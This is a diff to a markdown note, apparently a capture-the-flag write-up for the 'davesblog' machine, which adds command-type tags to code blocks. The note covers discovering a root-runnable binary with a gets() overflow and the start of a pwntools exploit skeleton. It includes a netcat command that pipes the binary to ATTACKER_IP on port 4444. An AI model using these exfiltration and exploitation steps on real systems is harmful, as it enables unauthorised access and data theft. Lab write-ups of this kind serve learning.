@@ -15,6 +15,7 @@ The user could run `/uid_checker` as root without a password. The binary called 
 
 ## Discovery
 
+<!-- cmd: linux -->
 ```bash
 sudo -l
 strings /uid_checker
@@ -22,6 +23,7 @@ strings /uid_checker
 
 Transfer the binary for reversing:
 
+<!-- cmd: linux -->
 ```bash
 nc -lvnp 4444 > uid_checker
 cat /uid_checker | nc ATTACKER_IP 4444
@@ -31,6 +33,7 @@ Used on: **davesblog** - `/uid_checker` contained `gets()` and could be run as r
 
 ## Exploit Skeleton
 
+<!-- cmd: python -->
 ```python
 from pwn import cyclic
 from pwnlib.tubes.ssh import ssh
